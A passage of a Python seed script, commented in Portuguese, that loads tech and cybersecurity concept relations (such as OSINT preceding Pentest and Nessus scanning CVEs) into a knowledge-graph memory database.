    ("Python", "linguagem_de", "Machine Learning"),
    ("Bash", "linguagem_de", "Linux"),
    ("Assembly x86", "base_de", "Buffer Overflow"),
    ("Active Directory", "usa", "Kerberos"),
    ("Linux", "base_de", "Docker"),
    ("Windows", "usa", "Active Directory"),
    ("Ethereum", "usa", "Criptografia"),
    ("Bitcoin", "usa", "SHA-256"),
    ("Machine Learning", "melhora", "EDR"),
    ("Machine Learning", "melhora", "SIEM"),
    ("LGPD", "regulamenta", "Privacidade"),
    ("OSINT", "precede", "Pentest"),
    ("Engenharia Social", "bypassa", "Criptografia"),
    ("Engenharia Social", "bypassa", "Zero Trust"),
    ("CVE", "pontuado_por", "CVSS"),
    ("Nessus", "escaneia", "CVE"),
    ("DNS", "vulneravel_a", "MITM"),
    ("HTTP/HTTPS", "protegido_por", "TLS"),
]

# ─────────────────────────────────────────────────────────────────────────────

def run_tech_seed(db: MemoryDB) -> None:
    existing = db.get_preference("cyber:fundamentos", "")
    if existing:
        log.info("Tech seed já aplicado — ignorando.")
        return

    log.info("Aplicando tech seed: %d entradas de conhecimento...", len(TECH_KNOWLEDGE))
    for key, value in TECH_KNOWLEDGE:
        db.set_preference(key, value)

    log.info("Adicionando %d entidades tech/cyber...", len(TECH_ENTITIES))
    for name, etype, cluster in TECH_ENTITIES:
        db.upsert_entity(name, etype, cluster)

    log.info("Adicionando %d relações tech/cyber...", len(TECH_RELATIONS))
    for from_n, rel, to_n in TECH_RELATIONS:
        # Garante que entidades existem antes de criar relação
        db.upsert_entity(from_n, "conceito", "TECH")
        db.upsert_entity(to_n, "conceito", "TECH")
        db.add_relation(from_n, to_n, rel)

    log.info("Tech seed concluído.")


if __name__ == "__main__":
    import logging as _logging
    _logging.basicConfig(level=_logging.INFO, format="%(message)s")
    config = load_config()
    db = MemoryDB(config.memory.db_path)
    db.initialize()
    run_tech_seed(db)
    stats = db.get_stats()
    print(f"\nBanco: {stats['nodes']} nós, {stats['edges']} conexões")
